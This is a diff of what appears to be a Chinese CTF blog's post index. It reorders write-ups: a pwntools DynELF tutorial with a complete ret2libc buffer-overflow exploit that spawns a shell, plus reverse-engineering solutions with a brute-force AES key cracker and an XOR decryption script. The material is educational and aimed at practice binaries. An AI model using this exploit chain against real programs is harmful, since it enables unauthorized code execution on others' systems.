   <entry>
-    <title>pwn学习之DynELF的使用</title>
-    <url>/2016/11/19/pwn%E5%AD%A6%E4%B9%A0%E4%B9%8BDynELF%E7%9A%84%E4%BD%BF%E7%94%A8/</url>
-    <content><![CDATA[<p>本文是针对一步一步学rop之x86篇中的test2的一种memory leak（内存泄漏）的方法，是通过pwntools中DynELF模块来进行内存搜索。在ctf比赛中常常会遇到一种不提供libc.so的题目，都可以利用这样的方法在内存中寻找system()地址。<br><a id="more"></a></p>
-<h2 id="leak函数"><a href="#leak函数" class="headerlink" title="leak函数"></a>leak函数</h2><pre><code>#!python
-def leak(address):
-    payload1 = &apos;a&apos;*140 + p32(plt_write) + p32(vulfun_addr) + p32(1) +p32(address) + p32(4)
-    p.send(payload1)
-    data = p.recv(4)
-    print &quot;%#x =&gt; %s&quot; % (address, (data or &apos;&apos;).encode(&apos;hex&apos;))
-return data
-</code></pre><p>随后将这个函数作为参数再调用d = DynELF(leak, elf=ELF(‘./test2’))就可以对DynELF模块进行初始化了。然后可以通过调用system_addr = d.lookup(‘system’, ‘libc’)来得到libc.so中system()在内存中的地址。</p>
-<h2 id="寻找地址"><a href="#寻找地址" class="headerlink" title="寻找地址"></a>寻找地址</h2><p>通过DynELF模块只能获取到system()在内存中的地址，但无法获取字符串“/bin/sh”在内存中的地址。所以我们在payload中需要调用read()将“/bin/sh”这字符串写入到程序的.bss段中。.bss段是用来保存全局变量的值的，地址固定，并且可以读可写。所以首先要找到bss段的地址通过readelf -S level2这个命令就可以获取到bss段的地址了。</p>
-<p>因为我们在执行完read()之后要接着调用system(“/bin/sh”)，并且read()这个函数的参数有三个，所以我们需要一个pop pop pop ret的gadget用来保证栈平衡。这个gadget非常好找，用objdump就可以轻松找到。</p>
-<p>最后需要寻找的就是vulfun_add,直接用gdb反编译一下程序就可以了。</p>
-<pre><code>da$ disassemble vlun_fun 
-Dump of assembler code for function vlun_fun:
-   0x0804844d &lt;+0&gt;:    push   ebp
-   0x0804844e &lt;+1&gt;:    mov    ebp,esp
-   0x08048450 &lt;+3&gt;:    sub    esp,0x98
-   0x08048456 &lt;+9&gt;:    mov    DWORD PTR [esp+0x8],0x100
-   0x0804845e &lt;+17&gt;:    lea    eax,[ebp-0x88]
-   0x08048464 &lt;+23&gt;:    mov    DWORD PTR [esp+0x4],eax
-   0x08048468 &lt;+27&gt;:    mov    DWORD PTR [esp],0x0
-   0x0804846f &lt;+34&gt;:    call   0x8048310 &lt;read@plt&gt;
-   0x08048474 &lt;+39&gt;:    leave  
-   0x08048475 &lt;+40&gt;:    ret    
-</code></pre><p>和明显地址是0x0804844d</p>
-<h2 id="最终的exp"><a href="#最终的exp" class="headerlink" title="最终的exp"></a>最终的exp</h2><p>整个攻击过程如下：首先通过DynELF获取到system()的地址后，我们又通过read将“/bin/sh”写入到.bss段上，最后再调用system（.bss），执行“/bin/sh”。最终的exp如下:</p>
-<pre><code>#!python
-#!/usr/bin/env python
-from pwn import *
-elf = ELF(&apos;./test2&apos;)
-plt_write = elf.symbols[&apos;write&apos;]
-plt_read = elf.symbols[&apos;read&apos;]
-vulfun_addr = 0x0804844d
-
-def leak(address):
-    payload1 = &apos;a&apos;*140 + p32(plt_write) + p32(vulfun_addr) + p32(1) +p32(address) + p32(4)
-    p.send(payload1)
-    data = p.recv(4)
-    print &quot;%#x =&gt; %s&quot; % (address, (data or &apos;&apos;).encode(&apos;hex&apos;))
-    return data
-p = process(&apos;./test2&apos;)
-gdb.attach(p,&quot;b *0x804850d&quot;)
-#p = remote(&apos;127.0.0.1&apos;, 10002)
-d = DynELF(leak, elf=ELF(&apos;./test2&apos;))
-system_addr = d.lookup(&apos;system&apos;, &apos;libc&apos;)
-print &quot;system_addr=&quot; + hex(system_addr)
-bss_addr = 0x0804a024
-pppr = 0x804850d
-payload2 = &apos;a&apos;*140  + p32(plt_read) + p32(pppr) + p32(0) + p32(bss_addr) + p32(8) 
-payload2 += p32(system_addr) + p32(vulfun_addr) + p32(bss_addr)
-payload2 += &apos;C&apos; * (256 - len(payload2))
-#ss = raw_input()
-print &quot;\n###sending payload2 ...###&quot;
-p.send(payload2)
-p.send(&quot;/bin/sh\0&quot;)
-p.interactive()
-</code></pre><p>这个exp在32kali上可以获得权限，在我的64位Ubuntu上无法获得权限，不知道为什么，纠结。。。。。。</p>
-]]></content>
-      <tags>
-        <tag>pwn</tag>
-      </tags>
-  </entry>
-  <entry>
     <title>pwn学习rop之x86篇</title>
     <url>/2016/11/19/pwn%E5%AD%A6%E4%B9%A0rop%E4%B9%8Bx86%E7%AF%87/</url>
     <content><![CDATA[<p>这段时间自学了蒸米大神写的一步一步学rop系列，以下都是我的学习心得。。。<br><a id="more"></a></p>
@@ -1585,6 +1532,71 @@ p.send(payload2)
 p.interactive()
 </code></pre><p><img src="http://i1.piimg.com/567571/4b23913d36d0894b.png" alt=""></p>
 <h2 id="小结"><a href="#小结" class="headerlink" title="小结"></a>小结</h2><p>本文主要介绍了x86——ROP攻击的基本原理,希望能帮到大家</p>
+]]></content>
+      <tags>
+        <tag>pwn</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title>pwn学习之DynELF的使用</title>
+    <url>/2016/11/19/pwn%E5%AD%A6%E4%B9%A0%E4%B9%8BDynELF%E7%9A%84%E4%BD%BF%E7%94%A8/</url>
+    <content><![CDATA[<p>本文是针对一步一步学rop之x86篇中的test2的一种memory leak（内存泄漏）的方法，是通过pwntools中DynELF模块来进行内存搜索。在ctf比赛中常常会遇到一种不提供libc.so的题目，都可以利用这样的方法在内存中寻找system()地址。<br><a id="more"></a></p>
+<h2 id="leak函数"><a href="#leak函数" class="headerlink" title="leak函数"></a>leak函数</h2><pre><code>#!python
+def leak(address):
+    payload1 = &apos;a&apos;*140 + p32(plt_write) + p32(vulfun_addr) + p32(1) +p32(address) + p32(4)
+    p.send(payload1)
+    data = p.recv(4)
+    print &quot;%#x =&gt; %s&quot; % (address, (data or &apos;&apos;).encode(&apos;hex&apos;))
+return data
+</code></pre><p>随后将这个函数作为参数再调用d = DynELF(leak, elf=ELF(‘./test2’))就可以对DynELF模块进行初始化了。然后可以通过调用system_addr = d.lookup(‘system’, ‘libc’)来得到libc.so中system()在内存中的地址。</p>
+<h2 id="寻找地址"><a href="#寻找地址" class="headerlink" title="寻找地址"></a>寻找地址</h2><p>通过DynELF模块只能获取到system()在内存中的地址，但无法获取字符串“/bin/sh”在内存中的地址。所以我们在payload中需要调用read()将“/bin/sh”这字符串写入到程序的.bss段中。.bss段是用来保存全局变量的值的，地址固定，并且可以读可写。所以首先要找到bss段的地址通过readelf -S level2这个命令就可以获取到bss段的地址了。</p>
+<p>因为我们在执行完read()之后要接着调用system(“/bin/sh”)，并且read()这个函数的参数有三个，所以我们需要一个pop pop pop ret的gadget用来保证栈平衡。这个gadget非常好找，用objdump就可以轻松找到。</p>
+<p>最后需要寻找的就是vulfun_add,直接用gdb反编译一下程序就可以了。</p>
+<pre><code>da$ disassemble vlun_fun 
+Dump of assembler code for function vlun_fun:
+   0x0804844d &lt;+0&gt;:    push   ebp
+   0x0804844e &lt;+1&gt;:    mov    ebp,esp
+   0x08048450 &lt;+3&gt;:    sub    esp,0x98
+   0x08048456 &lt;+9&gt;:    mov    DWORD PTR [esp+0x8],0x100
+   0x0804845e &lt;+17&gt;:    lea    eax,[ebp-0x88]
+   0x08048464 &lt;+23&gt;:    mov    DWORD PTR [esp+0x4],eax
+   0x08048468 &lt;+27&gt;:    mov    DWORD PTR [esp],0x0
+   0x0804846f &lt;+34&gt;:    call   0x8048310 &lt;read@plt&gt;
+   0x08048474 &lt;+39&gt;:    leave  
+   0x08048475 &lt;+40&gt;:    ret    
+</code></pre><p>和明显地址是0x0804844d</p>
+<h2 id="最终的exp"><a href="#最终的exp" class="headerlink" title="最终的exp"></a>最终的exp</h2><p>整个攻击过程如下：首先通过DynELF获取到system()的地址后，我们又通过read将“/bin/sh”写入到.bss段上，最后再调用system（.bss），执行“/bin/sh”。最终的exp如下:</p>
+<pre><code>#!python
+#!/usr/bin/env python
+from pwn import *
+elf = ELF(&apos;./test2&apos;)
+plt_write = elf.symbols[&apos;write&apos;]
+plt_read = elf.symbols[&apos;read&apos;]
+vulfun_addr = 0x0804844d
+
+def leak(address):
+    payload1 = &apos;a&apos;*140 + p32(plt_write) + p32(vulfun_addr) + p32(1) +p32(address) + p32(4)
+    p.send(payload1)
+    data = p.recv(4)
+    print &quot;%#x =&gt; %s&quot; % (address, (data or &apos;&apos;).encode(&apos;hex&apos;))
+    return data
+p = process(&apos;./test2&apos;)
+gdb.attach(p,&quot;b *0x804850d&quot;)
+#p = remote(&apos;127.0.0.1&apos;, 10002)
+d = DynELF(leak, elf=ELF(&apos;./test2&apos;))
+system_addr = d.lookup(&apos;system&apos;, &apos;libc&apos;)
+print &quot;system_addr=&quot; + hex(system_addr)
+bss_addr = 0x0804a024
+pppr = 0x804850d
+payload2 = &apos;a&apos;*140  + p32(plt_read) + p32(pppr) + p32(0) + p32(bss_addr) + p32(8) 
+payload2 += p32(system_addr) + p32(vulfun_addr) + p32(bss_addr)
+payload2 += &apos;C&apos; * (256 - len(payload2))
+#ss = raw_input()
+print &quot;\n###sending payload2 ...###&quot;
+p.send(payload2)
+p.send(&quot;/bin/sh\0&quot;)
+p.interactive()
+</code></pre><p>这个exp在32kali上可以获得权限，在我的64位Ubuntu上无法获得权限，不知道为什么，纠结。。。。。。</p>
 ]]></content>
       <tags>
         <tag>pwn</tag>
@@ -1995,266 +2007,6 @@ for i in buf1:
         nCurrent=d[nCurrent]
     flag+=&quot;%02X&quot;%nCurrent
 print(flag)
-</code></pre>]]></content>
-      <tags>
-        <tag>writeup</tag>
-        <tag>reverse</tag>
-      </tags>
-  </entry>
-  <entry>
-    <title>reverse之第六更</title>
-    <url>/2017/01/24/reverse%E4%B9%8B%E7%AC%AC%E5%85%AD%E6%9B%B4/</url>
-    <content><![CDATA[<p>本题同样也涉及到反调试技术，题目提供一个exe和一个dll，用IDA分析程序：<br><a id="more"></a></p>
-<p><img src="http://p1.bpimg.com/567571/70a93b006a742471.png" alt=""></p>
-<p>loc_402000是验证flag是否正确的函数，点开一看。。。一脸懵逼</p>
-<p><img src="http://p1.bqimg.com/567571/b0ab23cb23308271.png" alt=""></p>
-<p>应该是SMC，所谓SMC就是相当于把某些重要函数在二进制文件中进行加密，这些函数在程序执行的时候会动态解密。然而OD中会出现反调试。</p>
-<p>接下来运行程序，然后将之debugger attach到IDA上，加密数据段就解密了，不过可能是我的IDA的问题，这个过程十分漫长。。。。。。。</p>
-<p>加载完成之后</p>
-<p><img src="http://p1.bpimg.com/567571/e2027be2a13e885b.png" alt=""></p>
-<p>在loc_402000位置创建一下函数，F5反编译。发现这个函数首先为得到re1DLL.dll的Trololololololol数组，然后不断将用户输入与Trololololololol数组中的某些元素进行比较，前面一些比较指令相对比较简单，得到了flag的前半部分ISCC{N3v3r_7r4apped_6y_4nt!_XXXXX}<br>最后的XXXXX是通过re1DLL.dll的Derpaherp函数进行set的</p>
-<p> <img src="http://i1.piimg.com/567571/c77f2dcf766c9a0c.png" alt=""></p>
-<p>Derpaherp是有三个参数的，这里只有一个是IDA F5的锅，调到汇编仍然可以看到调用Derpaherp之前push了三个参数，最后会有一个strcmp，v13和unk_405048比较，我把unk_405048导出来发现其为ad42f6697b035b7580e4fef93be20b4d，是Md5，拖入cmd5.com跑了一下，跑出来是debug。由此也可以断定Derpaherp内部其实是实现了Md5计算，所以最后的flag为ISCC{N3v3r_7r4apped_6y_4nt!_debug}</p>
-]]></content>
-      <tags>
-        <tag>writeup</tag>
-        <tag>reverse</tag>
-      </tags>
-  </entry>
-  <entry>
-    <title>reverse之第十更</title>
-    <url>/2017/02/05/reverse%E4%B9%8B%E7%AC%AC%E5%8D%81%E6%9B%B4/</url>
-    <content><![CDATA[<p>一道比较复杂的算法Crack，主要考查CRC校验算法，AES加密，以及base64加密算法。<br><a id="more"></a><br>程序运行之后发现提示内容是Try angin！但是搜索字符串并没有，但是看到一个很像base64的字符串，过去发现各种算法以及调用，在函数开头下断，果然加密算法都在这个地方。</p>
-<p>在IDA中分析该函数</p>
-<pre><code>char __thiscall sub_401880(int this)
-{
-  int v1; // ebx@1
-  char v2; // al@1
-  char v3; // dh@1
-  char v4; // ch@1
-  char v5; // ah@1
-  char v6; // dl@1
-  char v7; // cl@1
-  unsigned int v8; // esi@7
-  unsigned int v9; // eax@7
-  char *v10; // ecx@7
-  char result; // al@8
-  unsigned int v12; // esi@10
-  wchar_t *v13; // edi@11
-  unsigned int v14; // ecx@13
-  unsigned int v15; // kr18_4@13
-  unsigned int v16; // kr1C_4@14
-  CHAR *v17; // ecx@18
-  char v18; // [sp+4h] [bp-1F8h]@1
-  char v19; // [sp+5h] [bp-1F7h]@1
-  char v20; // [sp+6h] [bp-1F6h]@1
-  char v21; // [sp+7h] [bp-1F5h]@1
-  char v22; // [sp+8h] [bp-1F4h]@1
-  char v23; // [sp+9h] [bp-1F3h]@1
-  char v24; // [sp+Ah] [bp-1F2h]@1
-  char v25; // [sp+Bh] [bp-1F1h]@1
-  char v26[200]; // [sp+Ch] [bp-1F0h]@13
-  char v27[132]; // [sp+D4h] [bp-128h]@10
-  __int128 v28; // [sp+158h] [bp-A4h]@13
-  __int128 v29; // [sp+168h] [bp-94h]@13
-  __int64 v30; // [sp+178h] [bp-84h]@13
-  int v31; // [sp+180h] [bp-7Ch]@13
-  char v32; // [sp+184h] [bp-78h]@13
-  char Dst; // [sp+185h] [bp-77h]@13
-  CHAR v34; // [sp+1BCh] [bp-40h]@7
-  int v35; // [sp+1D0h] [bp-2Ch]@10
-  int v36; // [sp+1D4h] [bp-28h]@10
-  int v37; // [sp+1D8h] [bp-24h]@10
-  int v38; // [sp+1DCh] [bp-20h]@10
-  CHAR v39[4]; // [sp+1E0h] [bp-1Ch]@1
-  int v40; // [sp+1E4h] [bp-18h]@1
-  __int16 v41; // [sp+1E8h] [bp-14h]@1
-  CHAR MultiByteStr[4]; // [sp+1ECh] [bp-10h]@1
-  int v43; // [sp+1F0h] [bp-Ch]@1
-  int v44; // [sp+1F4h] [bp-8h]@1
-
-  v1 = this;
-  *(_DWORD *)v39 = 0x20756F59;
-  v40 = &apos;!niW&apos;;
-  v41 = &apos;\0&apos;;
-  *(_DWORD *)MultiByteStr = &apos; yrT&apos;;
-  v2 = *(_BYTE *)this;
-  v3 = *(_BYTE *)(this + 1);
-  v4 = *(_BYTE *)(this + 2);
-  v5 = *(_BYTE *)(v1 + 3);
-  v6 = *(_BYTE *)(v1 + 4);
-  v7 = *(_BYTE *)(v1 + 5);
-  v18 = v2;
-  v43 = &apos;iaga&apos;;
-  v44 = &apos;!n&apos;;
-  v19 = v3;
-  v20 = v4;
-  v21 = 0;
-  v22 = v5;
-  v23 = v6;
-  v24 = v7;
-  v25 = 0;
-  if ( (unsigned __int8)(v2 - 65) &gt; 0x19u
-    || (unsigned __int8)(v3 - 65) &gt; 0x19u
-    || (unsigned __int8)(v4 - 65) &gt; 0x19u
-    || (unsigned __int8)(v5 - 65) &gt; 0x19u
-    || (unsigned __int8)(v6 - 65) &gt; 0x19u
-    || (unsigned __int8)(v7 - 65) &gt; 0x19u )
-  {
-    result = sub_4016D0(MultiByteStr);
-  }
-  else
-  {
-    v8 = CRC((int)&amp;v18, strlen(&amp;v18));
-    v9 = CRC((int)&amp;v22, strlen(&amp;v22));
-    sub_401490(&amp;WideCharStr, 30, L&quot;%08x%08x&quot;, v8, v9);
-    sub_401840(&amp;WideCharStr, &amp;v34);
-    sub_4016D0(MultiByteStr);
-    v10 = (char *)v1;
-    do
-      result = *v10++;
-    while ( result );
-    if ( !(((_BYTE)v10 - ((_BYTE)v1 + 1)) &amp; 0xF) )
-    {
-      v35 = 0x1020304;
-      v36 = 0x7080900;
-      v37 = 0xE0F0506;
-      v38 = 0xA0B0C0D;
-      sub_401380((_BYTE *)v1, (int)v27, strlen((const char *)v1), (int)&amp;v34, (int)&amp;v35);
-      v12 = 0;
-      if ( strlen((const char *)v1) )
-      {
-        v13 = &amp;WideCharStr;
-        do
-        {
-          sub_401490(v13, 3, L&quot;%02x&quot;, (unsigned __int8)v27[v12++]);
-          v13 += 2;
-        }
-        while ( v12 &lt; strlen((const char *)v1) );
-      }
-      sub_401840(&amp;WideCharStr, v27);
-      sub_401570(strlen(v27), (int)v27, v26);
-      v31 = &apos;=X7V&apos;;
-      _mm_storeu_si128((__m128i *)&amp;v28, _mm_loadu_si128((const __m128i *)&amp;xmmword_4034F4));
-      v32 = 0;
-      _mm_storeu_si128((__m128i *)&amp;v29, _mm_loadu_si128((const __m128i *)&amp;xmmword_403504));
-      _mm_storel_epi64((__m128i *)&amp;v30, _mm_loadl_epi64((const __m128i *)&amp;qword_403514));
-      memset(&amp;Dst, 0, 0x37u);
-      v14 = 0;
-      v15 = strlen((const char *)&amp;v28);
-      if ( v15 )
-      {
-        v16 = strlen(v26);
-        while ( v14 &lt; v16 )
-        {
-          if ( *((_BYTE *)&amp;v28 + v14) != v26[v14] )
-          {
-            v17 = MultiByteStr;
-            goto LABEL_19;
-          }
-          if ( ++v14 &gt;= v15 )
-            break;
-        }
-      }
-      v17 = v39;
-LABEL_19:
-      result = sub_4016D0(v17);
-    }
-  }
-  return result;
-}
-</code></pre><p>首先发现，成功和失败的提示被定义为字符串保存在函数中，程序运行之后才会出现。程序的大致流程是先将输入的前六位取出，判断是不是大写字母，如果不是就失败。</p>
-<p>之后将前六位分成两组，求其CRC32的校验码，CRC的算法如下：</p>
-<pre><code>uint crc32( uchar *buf, int len)
-{
-    uint ret = 0xFFFFFFFF;
-    int   i;
-    if( !init )
-    {
-         init_table();
-         init = 1;
-    }
-    for(i = 0; i &lt; len;i++)
-    {
-         ret = CRC32[((ret &amp; 0xFF) ^ buf[i])] ^ (ret &gt;&gt; 8);
-    }
-     ret = ~ret;
-    return ret;
-}
-</code></pre><p>CRC算法求解关键在于CRC表的生成，一般都是动态生成的，也可以静态定义，不过很麻烦。第一次求CRC初始的ret是-1，之后的ret就是上一次所求的CRC，以此原理将两部分的CRC转换为8位的16进制连接起来作为下面AES加密的密钥。</p>
-<p>加密之后的结果转换为16进制字符串，进行base64编码，与程序给出的XQXgWk5yLADiXx6hVQCAKxTjVQXiWxPhXASCKALhV7X=比较，base64转换过程中的置换表与平常的有些区别</p>
-<pre><code>0987654321ZYXWVUTSRQPONMLKJIHGFEDCBAzyxwvutsrqponmlkjihgfedcba+/
-</code></pre><p>最终求正确的注册码必须要枚举密钥，反解AES然后比较解密结果的前六位与密钥是否一致，脚本如下：</p>
-<pre><code># _*_ coding:utf-8 _*_
-
-from Crypto.Cipher import AES
-import string
-from zlib import crc32
-
-def crack():
-    atable=&apos;0987654321ZYXWVUTSRQPONMLKJIHGFEDCBAzyxwvutsrqponmlkjihgfedcba+/&apos;
-    btable=&apos;ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/&apos;
-    base=&apos;XQXgWk5yLADiXx6hVQCAKxTjVQXiWxPhXASCKALhV7X=&apos;
-    transtab=string.maketrans(atable,btable)
-    iv=&apos;\x04\x03\x02\x01\x00\x09\x08\x07\x06\x05\x0f\x0e\x0d\x0c\x0b\x0a&apos;
-    table=list(string.uppercase)
-    c=base.translate(transtab).decode(&apos;base64&apos;).decode(&apos;hex&apos;)
-    count=0
-    for i1 in table:
-        for i2 in table:
-            for i3 in table:
-                for i4 in table:
-                    for i5 in table:
-                        for i6 in table:
-                            key=&apos;%08x&apos;%(crc32(i1+i2+i3)&amp;0xffffffff)+&apos;%08x&apos;%(crc32(i4+i5+i6)&amp;0xffffffff)
-                            crypto=AES.new(key,AES.MODE_CBC,iv)
-                            m=crypto.decrypt(c)
-                            count+=1
-                            if count%5000000==0:
-                                print count
-                            if m[:6]==i1+i2+i3+i4+i5+i6:
-                                print &apos;flag:&apos;+m
-                                return
-if __name__==&apos;__main__&apos;:
-    crack()
-</code></pre>]]></content>
-      <tags>
-        <tag>writeup</tag>
-        <tag>reverse</tag>
-      </tags>
-  </entry>
-  <entry>
-    <title>reverse之第四更</title>
-    <url>/2017/01/20/reverse%E4%B9%8B%E7%AC%AC%E5%9B%9B%E6%9B%B4/</url>
-    <content><![CDATA[<p>首先读取文件的头四个字节判断是否是0x33465443，不是提示“你打开的不是.ctf加密文件”。<br><a id="more"></a></p>
-<p><img src="http://p1.bqimg.com/567571/a39714c92cd59c03.png" alt=""></p>
-<p>再接着读取了0x10个字节。它用来验证输入的密码是否正确。然后读取了4个字节，它决定了解密数据部分的长度。最后就是根据这个数据长度读取指定的字节数。</p>
-<p><img src="http://p1.bpimg.com/567571/fbd00866b10d1c81.png" alt=""></p>
-<p>整个加密文件有0x61C9个字节。所以真正的数据部分长度不会超过这个大小。观察加密文件头部，很容易找到数据部分的长度。</p>
-<p><img src="http://p1.bqimg.com/567571/d161617008852e03.png" alt=""></p>
-<p>整个文件0x619C个字节都是加密数据，前面的是头部。</p>
-<p>接下来就是解密，输入的密钥经过md5加密得到的16字节作为密钥对数据进行异或，每异或16字节，密钥就自增1，数据段里有部分数据是如下：</p>
-<p><img src="http://i1.piimg.com/567571/9eba76040404226a.png" alt=""><br>规律很明显，由此可以推断这一部分对应的明文是0x00,数据是从43 C9 FD开始加密，很容易推出加密的密钥是0x13,0x82,0xFE,0x47,0xe4,0xb9,0x8e,0xd8,0x68,0xfc,0xa1,0xd5,0x4a,0x4f,0x36,0x2</p>
-<p>解密脚本如下:</p>
-<pre><code>a=&apos;17 86 02 4B E8 BD 92 DC 6C 00 A5 D9 4E 53 3A 06&apos;
-aList=a.split(&apos; &apos;)
-oriList=[]
-for i in aList:
-    oriList.append((int(i,16)-4)&amp;0xff)
-print(oriList)
-f=open(&apos;1.ctf&apos;,&apos;rb&apos;)
-ctfdata=f.read()
-f.close()
-
-f=open(&apos;encrypt.ctf&apos;,&apos;wb&apos;)
-validData=ctfdata[0x2d:]
-for i in range(0,len(validData)):
-    data=int(validData[i].encode(&apos;hex&apos;),16)
-    tmp=data^oriList[i%16]
-    f.write(chr(tmp))
-    oriList[i%16]+=1
-    oriList[i%16]=oriList[i%16]&amp;0xff
-f.close()
 </code></pre>]]></content>
       <tags>
         <tag>writeup</tag>
@@ -2818,6 +2570,266 @@ f.close()
 //去花指令之后
 </code></pre><p>综上所述：14位连接一起就是注册码，因此注册码为”codebywidesoft”。</p>
 ]]></content>
+      <tags>
+        <tag>writeup</tag>
+        <tag>reverse</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title>reverse之第六更</title>
+    <url>/2017/01/24/reverse%E4%B9%8B%E7%AC%AC%E5%85%AD%E6%9B%B4/</url>
+    <content><![CDATA[<p>本题同样也涉及到反调试技术，题目提供一个exe和一个dll，用IDA分析程序：<br><a id="more"></a></p>
+<p><img src="http://p1.bpimg.com/567571/70a93b006a742471.png" alt=""></p>
+<p>loc_402000是验证flag是否正确的函数，点开一看。。。一脸懵逼</p>
+<p><img src="http://p1.bqimg.com/567571/b0ab23cb23308271.png" alt=""></p>
+<p>应该是SMC，所谓SMC就是相当于把某些重要函数在二进制文件中进行加密，这些函数在程序执行的时候会动态解密。然而OD中会出现反调试。</p>
+<p>接下来运行程序，然后将之debugger attach到IDA上，加密数据段就解密了，不过可能是我的IDA的问题，这个过程十分漫长。。。。。。。</p>
+<p>加载完成之后</p>
+<p><img src="http://p1.bpimg.com/567571/e2027be2a13e885b.png" alt=""></p>
+<p>在loc_402000位置创建一下函数，F5反编译。发现这个函数首先为得到re1DLL.dll的Trololololololol数组，然后不断将用户输入与Trololololololol数组中的某些元素进行比较，前面一些比较指令相对比较简单，得到了flag的前半部分ISCC{N3v3r_7r4apped_6y_4nt!_XXXXX}<br>最后的XXXXX是通过re1DLL.dll的Derpaherp函数进行set的</p>
+<p> <img src="http://i1.piimg.com/567571/c77f2dcf766c9a0c.png" alt=""></p>
+<p>Derpaherp是有三个参数的，这里只有一个是IDA F5的锅，调到汇编仍然可以看到调用Derpaherp之前push了三个参数，最后会有一个strcmp，v13和unk_405048比较，我把unk_405048导出来发现其为ad42f6697b035b7580e4fef93be20b4d，是Md5，拖入cmd5.com跑了一下，跑出来是debug。由此也可以断定Derpaherp内部其实是实现了Md5计算，所以最后的flag为ISCC{N3v3r_7r4apped_6y_4nt!_debug}</p>
+]]></content>
+      <tags>
+        <tag>writeup</tag>
+        <tag>reverse</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title>reverse之第四更</title>
+    <url>/2017/01/20/reverse%E4%B9%8B%E7%AC%AC%E5%9B%9B%E6%9B%B4/</url>
+    <content><![CDATA[<p>首先读取文件的头四个字节判断是否是0x33465443，不是提示“你打开的不是.ctf加密文件”。<br><a id="more"></a></p>
+<p><img src="http://p1.bqimg.com/567571/a39714c92cd59c03.png" alt=""></p>
+<p>再接着读取了0x10个字节。它用来验证输入的密码是否正确。然后读取了4个字节，它决定了解密数据部分的长度。最后就是根据这个数据长度读取指定的字节数。</p>
+<p><img src="http://p1.bpimg.com/567571/fbd00866b10d1c81.png" alt=""></p>
+<p>整个加密文件有0x61C9个字节。所以真正的数据部分长度不会超过这个大小。观察加密文件头部，很容易找到数据部分的长度。</p>
+<p><img src="http://p1.bqimg.com/567571/d161617008852e03.png" alt=""></p>
+<p>整个文件0x619C个字节都是加密数据，前面的是头部。</p>
+<p>接下来就是解密，输入的密钥经过md5加密得到的16字节作为密钥对数据进行异或，每异或16字节，密钥就自增1，数据段里有部分数据是如下：</p>
+<p><img src="http://i1.piimg.com/567571/9eba76040404226a.png" alt=""><br>规律很明显，由此可以推断这一部分对应的明文是0x00,数据是从43 C9 FD开始加密，很容易推出加密的密钥是0x13,0x82,0xFE,0x47,0xe4,0xb9,0x8e,0xd8,0x68,0xfc,0xa1,0xd5,0x4a,0x4f,0x36,0x2</p>
+<p>解密脚本如下:</p>
+<pre><code>a=&apos;17 86 02 4B E8 BD 92 DC 6C 00 A5 D9 4E 53 3A 06&apos;
+aList=a.split(&apos; &apos;)
+oriList=[]
+for i in aList:
+    oriList.append((int(i,16)-4)&amp;0xff)
+print(oriList)
+f=open(&apos;1.ctf&apos;,&apos;rb&apos;)
+ctfdata=f.read()
+f.close()
+
+f=open(&apos;encrypt.ctf&apos;,&apos;wb&apos;)
+validData=ctfdata[0x2d:]
+for i in range(0,len(validData)):
+    data=int(validData[i].encode(&apos;hex&apos;),16)
+    tmp=data^oriList[i%16]
+    f.write(chr(tmp))
+    oriList[i%16]+=1
+    oriList[i%16]=oriList[i%16]&amp;0xff
+f.close()
+</code></pre>]]></content>
+      <tags>
+        <tag>writeup</tag>
+        <tag>reverse</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title>reverse之第十更</title>
+    <url>/2017/02/05/reverse%E4%B9%8B%E7%AC%AC%E5%8D%81%E6%9B%B4/</url>
+    <content><![CDATA[<p>一道比较复杂的算法Crack，主要考查CRC校验算法，AES加密，以及base64加密算法。<br><a id="more"></a><br>程序运行之后发现提示内容是Try angin！但是搜索字符串并没有，但是看到一个很像base64的字符串，过去发现各种算法以及调用，在函数开头下断，果然加密算法都在这个地方。</p>
+<p>在IDA中分析该函数</p>
+<pre><code>char __thiscall sub_401880(int this)
+{
+  int v1; // ebx@1
+  char v2; // al@1
+  char v3; // dh@1
+  char v4; // ch@1
+  char v5; // ah@1
+  char v6; // dl@1
+  char v7; // cl@1
+  unsigned int v8; // esi@7
+  unsigned int v9; // eax@7
+  char *v10; // ecx@7
+  char result; // al@8
+  unsigned int v12; // esi@10
+  wchar_t *v13; // edi@11
+  unsigned int v14; // ecx@13
+  unsigned int v15; // kr18_4@13
+  unsigned int v16; // kr1C_4@14
+  CHAR *v17; // ecx@18
+  char v18; // [sp+4h] [bp-1F8h]@1
+  char v19; // [sp+5h] [bp-1F7h]@1
+  char v20; // [sp+6h] [bp-1F6h]@1
+  char v21; // [sp+7h] [bp-1F5h]@1
+  char v22; // [sp+8h] [bp-1F4h]@1
+  char v23; // [sp+9h] [bp-1F3h]@1
+  char v24; // [sp+Ah] [bp-1F2h]@1
+  char v25; // [sp+Bh] [bp-1F1h]@1
+  char v26[200]; // [sp+Ch] [bp-1F0h]@13
+  char v27[132]; // [sp+D4h] [bp-128h]@10
+  __int128 v28; // [sp+158h] [bp-A4h]@13
+  __int128 v29; // [sp+168h] [bp-94h]@13
+  __int64 v30; // [sp+178h] [bp-84h]@13
+  int v31; // [sp+180h] [bp-7Ch]@13
+  char v32; // [sp+184h] [bp-78h]@13
+  char Dst; // [sp+185h] [bp-77h]@13
+  CHAR v34; // [sp+1BCh] [bp-40h]@7
+  int v35; // [sp+1D0h] [bp-2Ch]@10
+  int v36; // [sp+1D4h] [bp-28h]@10
+  int v37; // [sp+1D8h] [bp-24h]@10
+  int v38; // [sp+1DCh] [bp-20h]@10
+  CHAR v39[4]; // [sp+1E0h] [bp-1Ch]@1
+  int v40; // [sp+1E4h] [bp-18h]@1
+  __int16 v41; // [sp+1E8h] [bp-14h]@1
+  CHAR MultiByteStr[4]; // [sp+1ECh] [bp-10h]@1
+  int v43; // [sp+1F0h] [bp-Ch]@1
+  int v44; // [sp+1F4h] [bp-8h]@1
+
+  v1 = this;
+  *(_DWORD *)v39 = 0x20756F59;
+  v40 = &apos;!niW&apos;;
+  v41 = &apos;\0&apos;;
+  *(_DWORD *)MultiByteStr = &apos; yrT&apos;;
+  v2 = *(_BYTE *)this;
+  v3 = *(_BYTE *)(this + 1);
+  v4 = *(_BYTE *)(this + 2);
+  v5 = *(_BYTE *)(v1 + 3);
+  v6 = *(_BYTE *)(v1 + 4);
+  v7 = *(_BYTE *)(v1 + 5);
+  v18 = v2;
